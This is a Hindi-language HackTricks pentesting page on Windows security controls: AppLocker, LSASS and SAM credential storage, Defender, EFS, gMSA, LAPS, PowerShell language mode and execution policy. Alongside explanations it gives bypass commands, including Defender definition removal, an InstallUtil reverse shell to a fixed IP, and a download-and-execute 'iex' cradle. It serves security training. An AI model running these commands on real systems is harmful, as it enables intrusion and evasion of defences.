# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

एक एप्लिकेशन व्हाइटलिस्ट एक अनुमोदित सॉफ़्टवेयर एप्लिकेशन या निष्पादन योग्य फ़ाइलों की सूची है जो एक सिस्टम पर मौजूद और चलाने की अनुमति है। इसका लक्ष्य पर्यावरण को हानिकारक मैलवेयर और अप्रूव्ड सॉफ़्टवेयर से बचाना है जो किसी संगठन की विशिष्ट व्यावसायिक आवश्यकताओं के साथ मेल नहीं खाता।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) माइक्रोसॉफ्ट का **एप्लिकेशन व्हाइटलिस्टिंग समाधान** है और सिस्टम प्रशासकों को **यह नियंत्रित करने की अनुमति देता है कि उपयोगकर्ता कौन से एप्लिकेशन और फ़ाइलें चला सकते हैं**। यह निष्पादन योग्य फ़ाइलों, स्क्रिप्ट, विंडोज इंस्टॉलर फ़ाइलों, DLLs, पैकेज्ड ऐप्स, और पैक्ड ऐप इंस्टॉलर पर **सूक्ष्म नियंत्रण** प्रदान करता है।\
यह सामान्य है कि संगठन **cmd.exe और PowerShell.exe** और कुछ निर्देशिकाओं में लिखने की अनुमति को **ब्लॉक करते हैं, लेकिन इसे सभी को बायपास किया जा सकता है**।

### Check

जांचें कि कौन सी फ़ाइलें/एक्सटेंशन ब्लैकलिस्टेड/व्हाइटलिस्टेड हैं:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
यह रजिस्ट्री पथ AppLocker द्वारा लागू की गई कॉन्फ़िगरेशन और नीतियों को समाहित करता है, जो सिस्टम पर लागू वर्तमान नियमों की समीक्षा करने का एक तरीका प्रदान करता है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### बायपास

- AppLocker नीति को बायपास करने के लिए उपयोगी **लिखने योग्य फ़ोल्डर**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर कुछ भी निष्पादित करने की अनुमति दे रहा है, तो ऐसे **लिखने योग्य फ़ोल्डर** हैं जिनका आप **बायपास करने** के लिए उपयोग कर सकते हैं।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- सामान्यतः **विश्वसनीय** [**"LOLBAS's"**](https://lolbas-project.github.io/) बाइनरीज़ भी AppLocker को बायपास करने के लिए उपयोगी हो सकती हैं।
- **खराब लिखे गए नियमों को भी बायपास किया जा सकता है**
- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी एक **फोल्डर `allowed`** नाम से बना सकते हैं और इसे अनुमति दी जाएगी।
- संगठन अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` निष्पादन योग्य** को **ब्लॉक करने** पर ध्यान केंद्रित करते हैं, लेकिन **अन्य** [**PowerShell निष्पादन योग्य स्थानों**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) को भूल जाते हैं जैसे कि `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe`।
- **DLL प्रवर्तन बहुत कम सक्षम** होता है क्योंकि यह सिस्टम पर अतिरिक्त लोड डाल सकता है, और यह सुनिश्चित करने के लिए आवश्यक परीक्षण की मात्रा। इसलिए **DLLs को बैकडोर के रूप में उपयोग करना AppLocker को बायपास करने में मदद करेगा**।
- आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके **Powershell** कोड को किसी भी प्रक्रिया में **निष्पादित** कर सकते हैं और AppLocker को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## क्रेडेंशियल्स स्टोरेज

### सुरक्षा खाता प्रबंधक (SAM)

स्थानीय क्रेडेंशियल्स इस फ़ाइल में मौजूद हैं, पासवर्ड हैश किए गए हैं।

### स्थानीय सुरक्षा प्राधिकरण (LSA) - LSASS

**क्रेडेंशियल्स** (हैश किए गए) इस उपप्रणाली की **मेमोरी** में **सहेजे** जाते हैं एकल साइन-ऑन कारणों के लिए।\
**LSA** स्थानीय **सुरक्षा नीति** (पासवर्ड नीति, उपयोगकर्ता अनुमतियाँ...), **प्रमाणीकरण**, **एक्सेस टोकन**... का प्रबंधन करता है।\
LSA वह होगा जो **SAM** फ़ाइल के अंदर प्रदान किए गए क्रेडेंशियल्स की **जांच** करेगा (स्थानीय लॉगिन के लिए) और एक डोमेन उपयोगकर्ता को प्रमाणित करने के लिए **डोमेन नियंत्रक** से **बात** करेगा।

**क्रेडेंशियल्स** **प्रक्रिया LSASS** के अंदर **सहेजे** जाते हैं: Kerberos टिकट, NT और LM हैश, आसानी से डिक्रिप्ट किए गए पासवर्ड।

### LSA रहस्य

LSA कुछ क्रेडेंशियल्स को डिस्क में सहेज सकता है:

- सक्रिय निर्देशिका के कंप्यूटर खाते का पासवर्ड (अप्राप्य डोमेन नियंत्रक)।
- Windows सेवाओं के खातों के पासवर्ड
- अनुसूचित कार्यों के लिए पासवर्ड
- अधिक (IIS अनुप्रयोगों का पासवर्ड...)

### NTDS.dit

यह सक्रिय निर्देशिका का डेटाबेस है। यह केवल डोमेन नियंत्रकों में मौजूद है।

## डिफेंडर

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक एंटीवायरस है जो Windows 10 और Windows 11 में उपलब्ध है, और Windows Server के संस्करणों में। यह सामान्य पेंटेस्टिंग उपकरणों जैसे **`WinPEAS`** को **ब्लॉक** करता है। हालाँकि, इन सुरक्षा उपायों को **बायपास करने** के तरीके हैं।

### जांच

**डिफेंडर** की **स्थिति** की जांच करने के लिए आप PS cmdlet **`Get-MpComputerStatus`** निष्पादित कर सकते हैं (यह जानने के लिए कि यह सक्रिय है, **`RealTimeProtectionEnabled`** का मान जांचें):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे सूचीबद्ध करने के लिए आप यह भी चला सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS फ़ाइलों को एन्क्रिप्शन के माध्यम से सुरक्षित करता है, एक **समान कुंजी** का उपयोग करते हुए जिसे **फाइल एन्क्रिप्शन कुंजी (FEK)** कहा जाता है। यह कुंजी उपयोगकर्ता की **सार्वजनिक कुंजी** के साथ एन्क्रिप्ट की जाती है और एन्क्रिप्टेड फ़ाइल के $EFS **वैकल्पिक डेटा स्ट्रीम** में संग्रहीत होती है। जब डिक्रिप्शन की आवश्यकता होती है, तो उपयोगकर्ता के डिजिटल प्रमाणपत्र की संबंधित **निजी कुंजी** का उपयोग FEK को $EFS स्ट्रीम से डिक्रिप्ट करने के लिए किया जाता है। अधिक जानकारी [यहां](https://en.wikipedia.org/wiki/Encrypting_File_System) मिल सकती है।

**उपयोगकर्ता की पहल के बिना डिक्रिप्शन परिदृश्य** में शामिल हैं:

- जब फ़ाइलें या फ़ोल्डर को गैर-EFS फ़ाइल सिस्टम, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) में स्थानांतरित किया जाता है, तो वे स्वचालित रूप से डिक्रिप्ट हो जाते हैं।
- SMB/CIFS प्रोटोकॉल के माध्यम से नेटवर्क पर भेजी गई एन्क्रिप्टेड फ़ाइलें प्रसारण से पहले डिक्रिप्ट की जाती हैं।

यह एन्क्रिप्शन विधि मालिक के लिए एन्क्रिप्टेड फ़ाइलों तक **पारदर्शी पहुंच** की अनुमति देती है। हालाँकि, केवल मालिक का पासवर्ड बदलने और लॉगिन करने से डिक्रिप्शन की अनुमति नहीं मिलेगी।

**मुख्य निष्कर्ष**:

- EFS एक समान FEK का उपयोग करता है, जो उपयोगकर्ता की सार्वजनिक कुंजी के साथ एन्क्रिप्ट किया गया है।
- डिक्रिप्शन के लिए उपयोगकर्ता की निजी कुंजी का उपयोग किया जाता है ताकि FEK तक पहुंचा जा सके।
- स्वचालित डिक्रिप्शन विशिष्ट परिस्थितियों के तहत होता है, जैसे FAT32 में कॉपी करना या नेटवर्क ट्रांसमिशन।
- एन्क्रिप्टेड फ़ाइलें मालिक के लिए बिना अतिरिक्त कदमों के सुलभ होती हैं।

### Check EFS info

जांचें कि क्या एक **उपयोगकर्ता** ने इस **सेवा** का उपयोग किया है यह जांचकर कि क्या यह पथ मौजूद है:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

जांचें **किसके पास** फ़ाइल तक **पहुँच** है `cipher /c \<file>\`\
आप `cipher /e` और `cipher /d` का उपयोग करके एक फ़ोल्डर के अंदर सभी फ़ाइलों को **एन्क्रिप्ट** और **डिक्रिप्ट** कर सकते हैं।

### Decrypting EFS files

#### Being Authority System

यह तरीका **पीड़ित उपयोगकर्ता** को होस्ट के अंदर एक **प्रक्रिया** चलाने की आवश्यकता है। यदि ऐसा है, तो `meterpreter` सत्रों का उपयोग करते हुए आप उपयोगकर्ता की प्रक्रिया के टोकन का अनुकरण कर सकते हैं (`impersonate_token` from `incognito`)। या आप बस उपयोगकर्ता की प्रक्रिया में `migrate` कर सकते हैं।

#### Knowing the users password

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ने IT बुनियादी ढांचों में सेवा खातों के प्रबंधन को सरल बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किया। पारंपरिक सेवा खातों के विपरीत जिनमें अक्सर "**पासवर्ड कभी समाप्त नहीं होता**" सेटिंग सक्षम होती है, gMSA एक अधिक सुरक्षित और प्रबंधनीय समाधान प्रदान करते हैं:

- **स्वचालित पासवर्ड प्रबंधन**: gMSA एक जटिल, 240-चरित्र पासवर्ड का उपयोग करते हैं जो डोमेन या कंप्यूटर नीति के अनुसार स्वचालित रूप से बदलता है। यह प्रक्रिया Microsoft की की वितरण सेवा (KDC) द्वारा संभाली जाती है, जिससे मैनुअल पासवर्ड अपडेट की आवश्यकता समाप्त हो जाती है।
- **सुरक्षा में वृद्धि**: ये खाते लॉकआउट के प्रति प्रतिरक्षित होते हैं और इंटरैक्टिव लॉगिन के लिए उपयोग नहीं किए जा सकते, जिससे उनकी सुरक्षा बढ़ती है।
- **कई होस्ट समर्थन**: gMSA को कई होस्टों के बीच साझा किया जा सकता है, जिससे वे कई सर्वरों पर चलने वाली सेवाओं के लिए आदर्श बन जाते हैं।
- **निर्धारित कार्य क्षमता**: प्रबंधित सेवा खातों के विपरीत, gMSA निर्धारित कार्यों को चलाने का समर्थन करते हैं।
- **सरल SPN प्रबंधन**: जब कंप्यूटर के sAMaccount विवरण या DNS नाम में परिवर्तन होते हैं, तो सिस्टम स्वचालित रूप से सेवा प्रिंसिपल नाम (SPN) को अपडेट करता है, जिससे SPN प्रबंधन सरल हो जाता है।

gMSA के लिए पासवर्ड LDAP प्रॉपर्टी _**msDS-ManagedPassword**_ में संग्रहीत होते हैं और डोमेन नियंत्रकों (DCs) द्वारा हर 30 दिन में स्वचालित रूप से रीसेट किए जाते हैं। यह पासवर्ड, जिसे [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) के रूप में जाना जाता है, केवल अधिकृत प्रशासकों और उन सर्वरों द्वारा पुनः प्राप्त किया जा सकता है जिन पर gMSA स्थापित हैं, जिससे एक सुरक्षित वातावरण सुनिश्चित होता है। इस जानकारी तक पहुँचने के लिए, एक सुरक्षित कनेक्शन जैसे LDAPS की आवश्यकता होती है, या कनेक्शन को 'Sealing & Secure' के साथ प्रमाणित किया जाना चाहिए।

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)

आप इस पासवर्ड को [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:** पढ़ सकते हैं।
```
/GMSAPasswordReader --AccountName jkohler
```
[**इस पोस्ट में अधिक जानकारी प्राप्त करें**](https://cube0x0.github.io/Relaying-for-gMSA/)

इसके अलावा, **gMSA** के **पासवर्ड** को **पढ़ने** के लिए **NTLM रिले हमले** को कैसे करना है, इस बारे में इस [वेब पृष्ठ](https://cube0x0.github.io/Relaying-for-gMSA/) की जांच करें।

## LAPS

**लोकल एडमिनिस्ट्रेटर पासवर्ड सॉल्यूशन (LAPS)**, जिसे [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से डाउनलोड किया जा सकता है, स्थानीय एडमिनिस्ट्रेटर पासवर्ड का प्रबंधन करने की अनुमति देता है। ये पासवर्ड, जो **यादृच्छिक**, अद्वितीय, और **नियमित रूप से बदले जाते हैं**, सक्रिय निर्देशिका में केंद्रीय रूप से संग्रहीत होते हैं। इन पासवर्डों तक पहुंच को अधिकृत उपयोगकर्ताओं के लिए ACLs के माध्यम से प्रतिबंधित किया गया है। पर्याप्त अनुमतियों के साथ, स्थानीय एडमिन पासवर्ड पढ़ने की क्षमता प्रदान की जाती है।

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **कई सुविधाओं को लॉक कर देता है** जो PowerShell का प्रभावी ढंग से उपयोग करने के लिए आवश्यक हैं, जैसे COM ऑब्जेक्ट्स को ब्लॉक करना, केवल अनुमोदित .NET प्रकारों, XAML-आधारित वर्कफ़्लो, PowerShell कक्षाओं, और अधिक की अनुमति देना।

### **जांचें**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### बायपास
```powershell
#Easy bypass
Powershell -version 2
```
वर्तमान Windows में वह Bypass काम नहीं करेगा लेकिन आप उपयोग कर सकते हैं [ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)।\
**इसे संकलित करने के लिए आपको** **ज़रूरत हो सकती है** **_एक संदर्भ जोड़ने के लिए_** -> _ब्राउज़_ -> _ब्राउज़_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ें और **परियोजना को .Net4.5 में बदलें**।

#### सीधे बायपास:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### रिवर्स शेल:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके **Powershell** कोड को किसी भी प्रक्रिया में निष्पादित कर सकते हैं और सीमित मोड को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS निष्पादन नीति

डिफ़ॉल्ट रूप से इसे **restricted** पर सेट किया गया है। इस नीति को बायपास करने के मुख्य तरीके:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

यह API है जिसका उपयोग उपयोगकर्ताओं को प्रमाणित करने के लिए किया जा सकता है।

SSPI उन दो मशीनों के लिए उपयुक्त प्रोटोकॉल खोजने के लिए जिम्मेदार होगा जो संवाद करना चाहती हैं। इसके लिए पसंदीदा विधि Kerberos है। फिर SSPI यह बातचीत करेगा कि कौन सा प्रमाणीकरण प्रोटोकॉल उपयोग किया जाएगा, इन प्रमाणीकरण प्रोटोकॉल को Security Support Provider (SSP) कहा जाता है, जो प्रत्येक Windows मशीन के अंदर DLL के रूप में स्थित होते हैं और दोनों मशीनों को संवाद करने के लिए समान का समर्थन करना चाहिए।

### Main SSPs

- **Kerberos**: पसंदीदा
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** और **NTLMv2**: संगतता कारणों से
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: वेब सर्वर और LDAP, MD5 हैश के रूप में पासवर्ड
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL और TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: इसका उपयोग उपयोग करने के लिए प्रोटोकॉल को बातचीत करने के लिए किया जाता है (Kerberos या NTLM, जिसमें Kerberos डिफ़ॉल्ट है)
- %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक विशेषता है जो **उच्च गतिविधियों के लिए सहमति प्रॉम्प्ट** सक्षम करती है।

{{#ref}}
windows-security-controls/uac-user-account-control.md
{{#endref}}

{{#include ../banners/hacktricks-training.md}}
